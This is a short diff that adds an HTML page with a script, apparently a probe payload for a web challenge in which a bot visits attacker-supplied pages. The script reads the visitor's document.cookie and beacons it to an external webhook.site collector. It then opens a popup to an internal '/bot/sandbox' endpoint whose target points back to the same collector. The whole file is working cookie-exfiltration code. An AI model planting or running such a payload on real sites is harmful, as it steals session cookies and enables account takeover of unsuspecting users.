@@ -1,0 +1,6 @@
+<!doctype html><script>
+function log(s,d){new Image().src='https://webhook.site/2531dabf-eb9f-480d-8460-e07d24bb6bb9?stage='+s+'&ts=1783184142650&d='+encodeURIComponent(String(d))+'&r='+Math.random()}
+log('popup-start','cookie='+document.cookie+' top='+(top===window));
+try{ let w=window.open("http://nginx/bot/sandbox?target=%2F%2Fwebhook.site%2F2531dabf-eb9f-480d-8460-e07d24bb6bb9%3Fstage%3Dpopup-inner-1783184142650",'_blank'); log('popup-ret', w===null?'null':String(w)); }catch(e){ log('popup-err', e.name+':'+e.message); }
+setTimeout(()=>log('popup-after','done'),2000);
+</script>
